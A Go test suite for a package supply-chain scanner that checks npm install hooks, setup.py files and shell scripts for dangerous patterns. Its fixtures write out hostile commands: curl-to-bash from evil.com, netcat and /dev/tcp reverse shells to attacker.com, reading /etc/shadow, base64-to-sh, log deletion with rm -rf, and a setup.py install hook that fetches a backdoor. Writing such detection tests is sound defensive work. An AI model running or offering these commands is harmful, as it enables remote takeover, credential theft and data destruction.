package analyzer

import (
	"fmt"
	"strings"
	"testing"
)

// ============================================================
// AnalyzeNPMScripts Tests
// ============================================================

// Test: No dangerous patterns in standard npm lifecycle scripts
// Justification: Build tools (jest, webpack, node index.js) execute in developer
//                environments, not at install time. Absence of install hooks is a
//                positive supply chain hygiene signal.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) - confirms
//         install-time hooks (preinstall/install/postinstall) as the primary npm
//         attack vector; non-install scripts are out of scope.
// Methodology: Pass standard build/test/start scripts to AnalyzeNPMScripts
// Result: Expects HasDangerousPatterns=false and RiskLevel=LOW
func TestAnalyzeNPMScripts_NoDangerousPatterns(t *testing.T) {
	scripts := map[string]string{
		"test":  "jest",
		"build": "webpack",
		"start": "node index.js",
	}

	analysis := AnalyzeNPMScripts(scripts)

	if analysis.HasDangerousPatterns {
		t.Error("Expected no dangerous patterns for benign scripts")
	}
	if analysis.RiskLevel != "LOW" {
		t.Errorf("Expected LOW risk level, got %s", analysis.RiskLevel)
	}
	if len(analysis.DangerousPatterns) != 0 {
		t.Errorf("Expected 0 dangerous patterns, got %d", len(analysis.DangerousPatterns))
	}
}

// Test: AnalyzeNPMScripts only evaluates install-time hooks, not all scripts
// Justification: npm only executes preinstall/install/postinstall during package
//                installation. Dangerous code in test/build/start scripts cannot
//                compromise a user's machine at install time.
// Source: npm lifecycle documentation; "Backstabber's Knife Collection" (Ohm et al., 2020)
//         Section 3.2 identifies postinstall as the dominant attack vector.
// Methodology: Place curl|bash and eval patterns in non-install scripts only;
//              verify AnalyzeNPMScripts ignores them.
// Result: Expects HasDangerousPatterns=false — dangerous content in non-install
//         scripts must not raise an alert.
func TestAnalyzeNPMScripts_IgnoresNonInstallScripts(t *testing.T) {
	scripts := map[string]string{
		"test":  "curl http://example.com | bash",
		"build": "eval(malicious_code)",
		"start": "wget http://example.com/script.sh",
	}

	analysis := AnalyzeNPMScripts(scripts)

	if analysis.HasDangerousPatterns {
		t.Errorf("Non-install scripts should be ignored; got patterns: %v", analysis.DangerousPatterns)
	}
	if analysis.RiskLevel != "LOW" {
		t.Errorf("Expected LOW risk level for non-install scripts, got %s", analysis.RiskLevel)
	}
}

// Test: Empty scripts map returns no risk
// Justification: A package with no scripts at all cannot execute arbitrary code
//                at install time; this is the safest possible state.
// Source: OSSF Scorecard — absence of install hooks scores highest for this category.
// Methodology: Pass empty map to AnalyzeNPMScripts
// Result: Expects HasDangerousPatterns=false and RiskLevel=LOW
func TestAnalyzeNPMScripts_EmptyMap(t *testing.T) {
	analysis := AnalyzeNPMScripts(map[string]string{})

	if analysis.HasDangerousPatterns {
		t.Error("Empty scripts map should not produce dangerous patterns")
	}
	if analysis.RiskLevel != "LOW" {
		t.Errorf("Expected LOW risk level for empty scripts, got %s", analysis.RiskLevel)
	}
}

// Test: curl piped to bash in a postinstall hook
// Justification: Downloading and immediately executing a remote shell script is the
//                canonical supply chain compromise technique. The attacker controls
//                both the URL and the executed payload; no user confirmation occurs.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — most common
//         npm malware technique (Table 2).
// Methodology: Pass postinstall hook with curl|bash to AnalyzeNPMScripts
// Result: Expects HIGH risk and the "curl/wget | bash" pattern to be detected
func TestAnalyzeNPMScripts_CurlPipeBash(t *testing.T) {
	scripts := map[string]string{
		"postinstall": "curl https://evil.com/script.sh | bash",
	}

	analysis := AnalyzeNPMScripts(scripts)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}
	if analysis.RiskLevel != "HIGH" {
		t.Errorf("Expected HIGH risk level, got %s", analysis.RiskLevel)
	}
	if len(analysis.DangerousPatterns) == 0 {
		t.Error("Expected at least one dangerous pattern")
	}

	foundCurlBash := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "curl/wget | bash" {
			foundCurlBash = true
			if p.Severity != "HIGH" {
				t.Errorf("Expected HIGH severity for curl | bash, got %s", p.Severity)
			}
		}
	}
	if !foundCurlBash {
		t.Error("Expected to find 'curl/wget | bash' pattern")
	}
}

// Test: eval() in a preinstall hook
// Justification: eval() executes arbitrary strings as code. In install hooks this
//                enables a compromised package to run attacker-controlled logic
//                derived from the environment or a remote source at install time.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — eval of
//         child_process output is a documented npm attack pattern.
// Methodology: Pass preinstall hook containing eval() to AnalyzeNPMScripts
// Result: Expects HIGH risk and "eval()" pattern detected
func TestAnalyzeNPMScripts_EvalUsage(t *testing.T) {
	scripts := map[string]string{
		"preinstall": "eval(require('child_process').execSync('whoami'))",
	}

	analysis := AnalyzeNPMScripts(scripts)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}
	if analysis.RiskLevel != "HIGH" {
		t.Errorf("Expected HIGH risk level, got %s", analysis.RiskLevel)
	}

	patterns := make(map[string]bool)
	for _, p := range analysis.DangerousPatterns {
		patterns[p.Pattern] = true
	}
	if !patterns["eval()"] {
		t.Error("Expected to find 'eval()' pattern")
	}
}

// Test: Sensitive environment variable access in postinstall hook
// Justification: Accessing CI/CD secrets (NPM_TOKEN, AWS_SECRET_ACCESS_KEY) in an
//                install hook enables credential exfiltration. This mirrors the
//                event-stream attack (2018) which harvested bitcoin wallet keys.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — credential theft
//         via environment variables is a documented npm attack category.
// Methodology: Pass postinstall script accessing $NPM_TOKEN and AWS_SECRET_ACCESS_KEY
// Result: Expects "sensitive env access" pattern with HIGH severity
func TestAnalyzeNPMScripts_SensitiveEnvAccess(t *testing.T) {
	scripts := map[string]string{
		"postinstall": "echo $NPM_TOKEN && process.env.AWS_SECRET_ACCESS_KEY",
	}

	analysis := AnalyzeNPMScripts(scripts)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}

	foundEnvAccess := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "sensitive env access" {
			foundEnvAccess = true
			if p.Severity != "HIGH" {
				t.Errorf("Expected HIGH severity, got %s", p.Severity)
			}
		}
	}
	if !foundEnvAccess {
		t.Error("Expected to find sensitive env access pattern")
	}
}

// Test: Base64-encoded payload decoded and executed in install hook
// Justification: Base64 encoding is used by attackers to obfuscate malicious payloads
//                from static scanners. The decode-then-execute pattern is a classic
//                obfuscation technique documented in real npm attacks.
// Source: "Towards Measuring Supply Chain Attacks" (NDSS 2020) — obfuscation via
//         encoding is a common evasion technique.
// Methodology: Pass install script with base64 -d piped to sh
// Result: Expects "base64 decode" pattern to be detected
func TestAnalyzeNPMScripts_Base64Decode(t *testing.T) {
	scripts := map[string]string{
		"install": "echo 'ZXZpbCBjb2Rl' | base64 -d | sh",
	}

	analysis := AnalyzeNPMScripts(scripts)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}

	foundBase64 := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "base64 decode" {
			foundBase64 = true
		}
	}
	if !foundBase64 {
		t.Error("Expected to find base64 decode pattern")
	}
}

// Test: HTTP download of an executable in postinstall hook
// Justification: Downloading executables over unencrypted HTTP allows MITM attacks
//                in addition to the risk of running attacker-supplied binaries.
//                Executable file extensions (.exe, .sh, .dll, .so) confirm the
//                intent to run the downloaded file.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — binary payload
//         download is a documented npm attack pattern.
// Methodology: Pass postinstall script with wget over HTTP targeting a .exe file
// Result: Expects HIGH risk and either HTTP download or executable download pattern
func TestAnalyzeNPMScripts_HTTPDownload(t *testing.T) {
	scripts := map[string]string{
		"postinstall": "wget http://insecure.com/malware.exe",
	}

	analysis := AnalyzeNPMScripts(scripts)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}
	if analysis.RiskLevel != "HIGH" {
		t.Errorf("Expected HIGH risk level, got %s", analysis.RiskLevel)
	}

	patterns := make(map[string]bool)
	for _, p := range analysis.DangerousPatterns {
		patterns[p.Pattern] = true
	}
	if !patterns["HTTP download"] && !patterns["executable download"] {
		t.Error("Expected to find HTTP or executable download pattern")
	}
}

// Test: Real-world JavaScript package with clean install lifecycle
// Justification: Validates the analyzer does not produce false positives on legitimate
//                npm packages. Standard scripts (start, dev, test) cannot execute
//                at install time and must not raise supply chain risk alerts.
// Source: OSSF Scorecard methodology — only install-time hooks are scored as
//         Category 4 (Install Execution) risk.
// Methodology: Use scripts extracted from /Users/mike/Projects/mike-libraries/javascript/package.json
//              which has start/dev/test hooks but no preinstall/install/postinstall.
// Result: Expects HasDangerousPatterns=false (no install hooks present in this package)
func TestAnalyzeNPMScripts_RealWorldJavaScriptPackage(t *testing.T) {
	// Scripts from /Users/mike/Projects/mike-libraries/javascript/package.json
	scripts := map[string]string{
		"start": "node app.js",
		"dev":   "nodemon app.js",
		"test":  "jest",
	}

	analysis := AnalyzeNPMScripts(scripts)

	if analysis.HasDangerousPatterns {
		patterns := []string{}
		for _, p := range analysis.DangerousPatterns {
			patterns = append(patterns, p.Pattern+": "+p.Match)
		}
		t.Errorf("False positive: legitimate package flagged. Patterns: %v", patterns)
	}
	if analysis.RiskLevel != "LOW" {
		t.Errorf("Expected LOW risk level for legitimate package, got %s", analysis.RiskLevel)
	}
}

// ============================================================
// AnalyzePythonSetup Tests
// ============================================================

// Test: Clean setup.py with no dangerous patterns
// Justification: A standard setuptools setup() with no custom cmdclass and no
//                network requests is the expected baseline for safe packages.
// Source: OSSF Scorecard — absence of install-time code execution as a positive signal.
// Methodology: Pass minimal setup.py content to AnalyzePythonSetup
// Result: Expects HasDangerousPatterns=false and RiskLevel=LOW
func TestAnalyzePythonSetup_NoPatterns(t *testing.T) {
	setupContent := `
from setuptools import setup, find_packages

setup(
    name='mypackage',
    version='1.0.0',
    packages=find_packages(),
)
`

	analysis := AnalyzePythonSetup(setupContent)

	if analysis.HasDangerousPatterns {
		t.Error("Expected no dangerous patterns for benign setup.py")
	}
	if analysis.RiskLevel != "LOW" {
		t.Errorf("Expected LOW risk level, got %s", analysis.RiskLevel)
	}
}

// Test: cmdclass override that executes a remote script
// Justification: Overriding setuptools command classes allows arbitrary code
//                execution during pip install. This pattern was used in the
//                "colourama" and other supply chain attacks to bypass naive scanning.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — cmdclass
//         override is a documented PyPI attack vector (Table 3).
// Methodology: Pass setup.py with CustomInstall(install) executing curl|sh to
//              AnalyzePythonSetup
// Result: Expects "cmdclass override" and "curl/wget | bash" patterns detected
func TestAnalyzePythonSetup_CmdClassOverride(t *testing.T) {
	setupContent := `
from setuptools import setup
from setuptools.command.install import install

class CustomInstall(install):
    def run(self):
        import os
        os.system('curl http://evil.com/backdoor.sh | sh')
        install.run(self)

setup(
    name='evil-package',
    cmdclass={'install': CustomInstall},
)
`

	analysis := AnalyzePythonSetup(setupContent)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}

	patterns := make(map[string]bool)
	for _, p := range analysis.DangerousPatterns {
		patterns[p.Pattern] = true
	}
	if !patterns["cmdclass override"] {
		t.Error("Expected to find cmdclass override pattern")
	}
	if !patterns["curl/wget | bash"] {
		t.Error("Expected to find curl | bash pattern")
	}
}

// Test: Network requests imported and used during setup execution
// Justification: A setup.py that makes outbound HTTP requests during installation
//                can exfiltrate environment data (hostname, user, installed packages)
//                or fetch additional malicious payloads.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — data exfiltration
//         via HTTP from setup.py is documented as an attack pattern.
// Methodology: Pass setup.py importing requests and calling requests.get() over HTTP
// Result: Expects "network import" and "HTTP download" patterns detected
func TestAnalyzePythonSetup_NetworkImport(t *testing.T) {
	setupContent := `
import requests
from setuptools import setup

response = requests.get('http://evil.com/config.json')
setup(name='evil', version='1.0')
`

	analysis := AnalyzePythonSetup(setupContent)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}

	foundNetworkImport := false
	foundHTTPDownload := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "network import" {
			foundNetworkImport = true
		}
		if p.Pattern == "HTTP download" {
			foundHTTPDownload = true
		}
	}
	if !foundNetworkImport {
		t.Error("Expected to find network import pattern")
	}
	if !foundHTTPDownload {
		t.Error("Expected to find HTTP download pattern")
	}
}

// Test: Dynamic __import__() call in setup.py
// Justification: __import__() bypasses static import analysis and allows a
//                compromised package to load arbitrary modules at install time,
//                including modules that execute malicious payloads.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — dynamic import
//         is a documented obfuscation and evasion technique.
// Methodology: Pass setup.py with __import__() call to AnalyzePythonSetup
// Result: Expects "__import__" pattern detected with MEDIUM severity
func TestAnalyzePythonSetup_DynamicImport(t *testing.T) {
	setupContent := `
from setuptools import setup

mod = __import__('subprocess')
mod.call(['curl', 'http://evil.com/exfil'])

setup(name='evil', version='1.0')
`

	analysis := AnalyzePythonSetup(setupContent)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}

	foundDynImport := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "__import__" {
			foundDynImport = true
			if p.Severity != "MEDIUM" {
				t.Errorf("Expected MEDIUM severity for __import__, got %s", p.Severity)
			}
		}
	}
	if !foundDynImport {
		t.Error("Expected to find __import__ pattern")
	}
}

// Test: Real-world Python application code produces no false positives
// Justification: Validates the analyzer correctly handles legitimate Flask/SQLAlchemy
//                application code. Python app files use os.getenv() with non-sensitive
//                keys (REDIS_HOST, REDIS_PORT) which must not trigger supply chain alerts.
// Source: OSSF Scorecard methodology — only install-time setup.py patterns are
//         relevant for Category 4 (Install Execution) risk.
// Methodology: Pass app.py content from /Users/mike/Projects/mike-libraries/python/app.py
//              to AnalyzePythonSetup; the file has no dangerous install-time patterns.
// Result: Expects HasDangerousPatterns=false and RiskLevel=LOW
func TestAnalyzePythonSetup_RealWorldCleanApp(t *testing.T) {
	// Content from /Users/mike/Projects/mike-libraries/python/app.py
	// Flask web app using SQLAlchemy, Redis, dotenv — no install-time execution
	appContent := `
from flask import Flask, jsonify, request
from sqlalchemy import create_engine, Column, Integer, String
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker
import redis
import os
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)

redis_client = redis.Redis(
    host=os.getenv('REDIS_HOST', 'localhost'),
    port=int(os.getenv('REDIS_PORT', 6379)),
    decode_responses=True
)

@app.route('/health')
def health():
    return jsonify({'status': 'healthy'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
`

	analysis := AnalyzePythonSetup(appContent)

	if analysis.HasDangerousPatterns {
		patterns := []string{}
		for _, p := range analysis.DangerousPatterns {
			patterns = append(patterns, p.Pattern+": "+p.Match)
		}
		t.Errorf("False positive on legitimate Flask app. Patterns found: %v", patterns)
	}
	if analysis.RiskLevel != "LOW" {
		t.Errorf("Expected LOW risk level for legitimate app, got %s", analysis.RiskLevel)
	}
}


// ============================================================
// AnalyzeScript Tests (generic script patterns)
// ============================================================

// Test: netcat command used to open a reverse shell
// Justification: netcat with the -e flag spawns a shell connected to a remote
//                host, creating a classic reverse shell. This is the primary
//                mechanism for persistent remote access after initial compromise.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — reverse shell
//         techniques are documented post-exploitation patterns.
// Methodology: Pass nc -e /bin/sh command to AnalyzeScript
// Result: Expects HIGH risk and "netcat/telnet" pattern detected
func TestAnalyzeScript_Netcat(t *testing.T) {
	script := "nc -e /bin/sh attacker.com 4444"

	analysis := AnalyzeScript(script)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}
	if analysis.RiskLevel != "HIGH" {
		t.Errorf("Expected HIGH risk level, got %s", analysis.RiskLevel)
	}

	foundNetcat := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "netcat/telnet" {
			foundNetcat = true
		}
	}
	if !foundNetcat {
		t.Error("Expected to find netcat pattern")
	}
}

// Test: Bash /dev/tcp redirect for reverse shell without netcat
// Justification: /dev/tcp is a bash built-in that opens a TCP connection without
//                requiring external tools. Redirecting stdin/stdout through it
//                creates a reverse shell that bypasses firewalls blocking raw
//                socket tools like netcat.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — /dev/tcp
//         redirection documented as a netcat-free reverse shell technique.
// Methodology: Pass bash reverse shell using /dev/tcp to AnalyzeScript
// Result: Expects HIGH severity "/dev/tcp" pattern detected
func TestAnalyzeScript_DevTCP(t *testing.T) {
	script := "bash -i >& /dev/tcp/attacker.com/4444 0>&1"

	analysis := AnalyzeScript(script)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}

	foundDevTCP := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "/dev/tcp" {
			foundDevTCP = true
			if p.Severity != "HIGH" {
				t.Errorf("Expected HIGH severity, got %s", p.Severity)
			}
		}
	}
	if !foundDevTCP {
		t.Error("Expected to find /dev/tcp pattern")
	}
}

// Test: Reading system authentication files (passwd, shadow)
// Justification: /etc/passwd and /etc/shadow contain user account information
//                and password hashes. Exfiltrating these enables offline password
//                cracking and lateral movement.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — credential file
//         access is a documented supply chain attack exfiltration technique.
// Methodology: Pass cat /etc/passwd && /etc/shadow command to AnalyzeScript
// Result: Expects "system auth file access" pattern detected
func TestAnalyzeScript_SystemAuthFiles(t *testing.T) {
	script := "cat /etc/passwd && cat /etc/shadow"

	analysis := AnalyzeScript(script)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}

	foundAuthFile := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "system auth file access" {
			foundAuthFile = true
		}
	}
	if !foundAuthFile {
		t.Error("Expected to find system auth file access pattern")
	}
}

// Test: Access to sensitive user config directories (~/.ssh, ~/.aws, ~/.gnupg)
// Justification: Accessing ~/.ssh/id_rsa, ~/.aws/credentials, or ~/.gnupg exfiltrates
//                private keys and cloud credentials. This enables persistent access,
//                account takeover, and lateral movement to cloud infrastructure.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — credential directory
//         enumeration is a documented npm/PyPI attack objective.
// Methodology: Pass cp to ~/.ssh/id_rsa command to AnalyzeScript
// Result: Expects "config directory access" pattern detected
func TestAnalyzeScript_ConfigDirectory(t *testing.T) {
	script := "cp sensitive-key ~/.ssh/id_rsa"

	analysis := AnalyzeScript(script)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}

	foundConfig := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "config directory access" {
			foundConfig = true
		}
	}
	if !foundConfig {
		t.Error("Expected to find config directory access pattern")
	}
}

// Test: node -e inline code execution
// Justification: `node -e` executes arbitrary JavaScript from the command line.
//                In install scripts, this is commonly used to obfuscate payloads
//                that would otherwise be detected as suspicious JavaScript files.
// Source: "Towards Measuring Supply Chain Attacks" (NDSS 2020) — inline interpreter
//         invocation is a documented obfuscation technique.
// Methodology: Pass node -e with inline code to AnalyzeScript
// Result: Expects "node -e" pattern with MEDIUM severity detected
func TestAnalyzeScript_NodeEval(t *testing.T) {
	script := "node -e 'require(\"child_process\").exec(\"id\", console.log)'"

	analysis := AnalyzeScript(script)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}

	foundNodeE := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "node -e" {
			foundNodeE = true
			if p.Severity != "MEDIUM" {
				t.Errorf("Expected MEDIUM severity for node -e, got %s", p.Severity)
			}
		}
	}
	if !foundNodeE {
		t.Error("Expected to find 'node -e' pattern")
	}
}

// Test: python -c inline code execution
// Justification: `python -c` executes arbitrary Python from the command line.
//                Attackers use this to embed obfuscated payloads directly in
//                shell scripts, bypassing file-based scanning.
// Source: "Towards Measuring Supply Chain Attacks" (NDSS 2020) — inline interpreter
//         invocation documented alongside base64 obfuscation patterns.
// Methodology: Pass python -c with inline os.system call to AnalyzeScript
// Result: Expects "python -c" pattern with MEDIUM severity detected
func TestAnalyzeScript_PythonInlineExec(t *testing.T) {
	script := "python -c 'import os; os.system(\"id\")'"

	analysis := AnalyzeScript(script)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}

	foundPythonC := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "python -c" {
			foundPythonC = true
			if p.Severity != "MEDIUM" {
				t.Errorf("Expected MEDIUM severity for python -c, got %s", p.Severity)
			}
		}
	}
	if !foundPythonC {
		t.Error("Expected to find 'python -c' pattern")
	}
}

// Test: chmod +x makes a downloaded file executable
// Justification: chmod +x or chmod 777 is typically the last step before executing
//                a downloaded payload. Detection of this pattern alongside a download
//                command signals a two-stage dropper technique.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — chmod before
//         execution is a documented technique in npm/PyPI malware.
// Methodology: Pass chmod +x on a downloaded file to AnalyzeScript
// Result: Expects "chmod +x/777" pattern with MEDIUM severity detected
func TestAnalyzeScript_ChmodExec(t *testing.T) {
	script := "chmod +x /tmp/malware.sh && /tmp/malware.sh"

	analysis := AnalyzeScript(script)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}

	foundChmod := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "chmod +x/777" {
			foundChmod = true
			if p.Severity != "MEDIUM" {
				t.Errorf("Expected MEDIUM severity for chmod +x/777, got %s", p.Severity)
			}
		}
	}
	if !foundChmod {
		t.Error("Expected to find 'chmod +x/777' pattern")
	}
}

// Test: rm -rf / deletes from the root filesystem
// Justification: Recursive forced deletion from root can destroy the entire
//                filesystem. Used by destructive malware to cover tracks or as a
//                wiper payload after credential exfiltration.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — destructive
//         payloads targeting the filesystem are a documented supply chain attack type.
// Methodology: Pass rm -rf /important command to AnalyzeScript
// Result: Expects "rm -rf /" pattern with HIGH severity detected
func TestAnalyzeScript_RmRfRoot(t *testing.T) {
	script := "rm -rf /var/log/audit"

	analysis := AnalyzeScript(script)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}

	foundRmRf := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "rm -rf /" {
			foundRmRf = true
			if p.Severity != "HIGH" {
				t.Errorf("Expected HIGH severity for rm -rf /, got %s", p.Severity)
			}
		}
	}
	if !foundRmRf {
		t.Error("Expected to find 'rm -rf /' pattern")
	}
}

// Test: exec() / subprocess call spawns child processes
// Justification: exec() in Python or shell scripts launches child processes that
//                can run arbitrary commands. In install hooks, this is used to
//                execute staged payloads or make outbound connections.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — child process
//         spawning is a core technique for executing staged malware.
// Methodology: Pass exec() call with a command to AnalyzeScript
// Result: Expects "process spawn" pattern with MEDIUM severity detected
func TestAnalyzeScript_ProcessSpawn(t *testing.T) {
	script := "exec('curl http://evil.com/backdoor | sh')"

	analysis := AnalyzeScript(script)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}

	foundSpawn := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "process spawn" {
			foundSpawn = true
			if p.Severity != "MEDIUM" {
				t.Errorf("Expected MEDIUM severity for process spawn, got %s", p.Severity)
			}
		}
	}
	if !foundSpawn {
		t.Error("Expected to find 'process spawn' pattern")
	}
}

// Test: HTTPS download without executable extension is not a false positive
// Justification: wget/curl over HTTPS downloading non-executable archives (e.g. .tar.gz)
//                is standard build toolchain behavior and must not be flagged as an
//                HTTP download risk. The HTTP download pattern specifically targets
//                unencrypted (http://) requests.
// Source: OSSF Scorecard methodology — HTTPS is a baseline security requirement,
//         not itself a risk signal.
// Methodology: Pass wget HTTPS download of a .tar.gz archive to AnalyzeScript
// Result: Expects "HTTP download" pattern NOT triggered (HTTPS is not HTTP)
func TestAnalyzeScript_HTTPSNoFalsePositive(t *testing.T) {
	script := "wget https://legitimate-cdn.example.com/package.tar.gz"

	analysis := AnalyzeScript(script)

	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "HTTP download" {
			t.Errorf("HTTPS download should not trigger HTTP download pattern; match: %s", p.Match)
		}
	}
}

// Test: Multiple dangerous patterns in a single script produce HIGH risk
// Justification: Real-world supply chain attacks combine multiple techniques to
//                ensure success if one is blocked. A script combining curl|bash,
//                eval, env variable access, and destructive rm is a strong
//                indicator of intentional malicious behavior.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — multi-technique
//         attacks are more sophisticated and harder to attribute.
// Methodology: Pass script with curl|bash, eval, env access, and rm -rf to AnalyzeScript
// Result: Expects HIGH risk and at least 3 distinct dangerous patterns
func TestAnalyzeScript_MultiplePatterns(t *testing.T) {
	script := `
		curl -s http://evil.com/script.sh | bash
		eval(malicious_code)
		process.env.AWS_SECRET_KEY
		rm -rf /important/data
	`

	analysis := AnalyzeScript(script)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}
	if analysis.RiskLevel != "HIGH" {
		t.Errorf("Expected HIGH risk level, got %s", analysis.RiskLevel)
	}
	if len(analysis.DangerousPatterns) < 3 {
		t.Errorf("Expected at least 3 dangerous patterns, got %d", len(analysis.DangerousPatterns))
	}

	patternNames := []string{}
	seen := make(map[string]bool)
	for _, p := range analysis.DangerousPatterns {
		if !seen[p.Pattern] {
			patternNames = append(patternNames, p.Pattern)
			seen[p.Pattern] = true
		}
	}
	if len(patternNames) < 3 {
		t.Errorf("Expected at least 3 distinct pattern types, got %d: %v", len(patternNames), patternNames)
	}
}

// Test: script with only HIGH severity patterns produces HIGH risk level
// Justification: The risk level algorithm elevates to HIGH as soon as any HIGH
//                severity pattern is detected. A single curl|bash is enough.
// Source: OSSF Scorecard — binary HIGH/MEDIUM/LOW risk thresholds based on
//         worst detected severity.
// Methodology: Verify that the risk level calculation correctly reflects HIGH
//              severity when at least one HIGH severity pattern is present.
// Result: Expects RiskLevel=HIGH when any pattern with Severity=HIGH is found
func TestAnalyzeScript_RiskLevelElevatesOnHighSeverityPattern(t *testing.T) {
	script := "curl http://evil.com/backdoor.sh | bash"

	analysis := AnalyzeScript(script)

	hasHighPattern := false
	for _, p := range analysis.DangerousPatterns {
		if p.Severity == "HIGH" {
			hasHighPattern = true
			break
		}
	}

	if hasHighPattern && analysis.RiskLevel != "HIGH" {
		t.Errorf("Risk level should be HIGH when a HIGH severity pattern is present, got %s", analysis.RiskLevel)
	}
	if !hasHighPattern {
		t.Error("Expected at least one HIGH severity pattern from curl|bash")
	}
}

// Test: Script with only MEDIUM severity patterns produces MEDIUM risk level
// Justification: When no HIGH severity patterns are present but MEDIUM patterns
//                exist, the risk level should reflect MEDIUM — not erroneously
//                collapse to LOW or escalate to HIGH.
// Source: OSSF Scorecard — tiered severity levels prevent alert fatigue while
//         ensuring moderate risks are communicated.
// Methodology: Pass a script with only base64 decode (MEDIUM) to AnalyzeScript
// Result: Expects RiskLevel=MEDIUM when only MEDIUM severity patterns are found
func TestAnalyzeScript_RiskLevelMediumOnlyMediumPatterns(t *testing.T) {
	script := "echo 'dGVzdA==' | base64 --decode"

	analysis := AnalyzeScript(script)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected base64 decode to be detected")
	}

	for _, p := range analysis.DangerousPatterns {
		if p.Severity == "HIGH" {
			t.Errorf("Did not expect HIGH severity pattern, got: %s", p.Pattern)
		}
	}

	if analysis.RiskLevel != "MEDIUM" {
		t.Errorf("Expected MEDIUM risk level when only MEDIUM patterns present, got %s", analysis.RiskLevel)
	}
}

// Test: Match field captures the actual matched text from the script
// Justification: The Match field provides evidence for security analysts reviewing
//                alerts. It must contain the actual matched string, not a generic
//                description, to enable accurate triage.
// Source: OSSF Scorecard evidence trail requirements — findings must include
//         verifiable evidence, not just assertions.
// Methodology: Check that DangerousPattern.Match is non-empty and is a substring
//              of the analyzed script.
// Result: Expects Match field to be non-empty and present in the original script
func TestAnalyzeScript_MatchFieldContainsEvidence(t *testing.T) {
	script := "curl http://evil.com/script.sh | bash"

	analysis := AnalyzeScript(script)

	if len(analysis.DangerousPatterns) == 0 {
		t.Fatal("Expected at least one dangerous pattern")
	}

	for _, p := range analysis.DangerousPatterns {
		if p.Match == "" {
			t.Errorf("Pattern '%s' has empty Match field; should contain matched text", p.Pattern)
		}
		if !strings.Contains(script, p.Match) {
			t.Errorf("Pattern '%s' Match '%s' is not a substring of the original script", p.Pattern, p.Match)
		}
	}
}

// ============================================================
// AnalyzePythonSetup Enhanced Pattern Tests
// ============================================================

// Test: AnalyzePythonSetup detects os.system() calls
// Justification: os.system() in setup.py executes arbitrary shell commands during
//                pip install. This is the most common attack pattern in malicious
//                PyPI packages — used in typosquatting attacks like "python3-dateutil".
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — categorizes
//         os.system() as a primary code execution vector in supply chain attacks
// Methodology: Pass setup.py content with os.system() call to AnalyzePythonSetup
// Result: Detected as HIGH severity "os.system/popen/exec" pattern
func TestAnalyzePythonSetup_OsSystem(t *testing.T) {
	setupContent := `
from setuptools import setup
import os

os.system('curl https://evil.com/payload.sh | bash')

setup(name='malicious-pkg', version='1.0.0')
`
	analysis := AnalyzePythonSetup(setupContent)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns for os.system() call")
	}

	found := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "os.system/popen/exec" {
			found = true
			if p.Severity != "HIGH" {
				t.Errorf("Expected HIGH severity, got %s", p.Severity)
			}
		}
	}
	if !found {
		t.Error("Expected os.system/popen/exec pattern to be detected")
	}
}

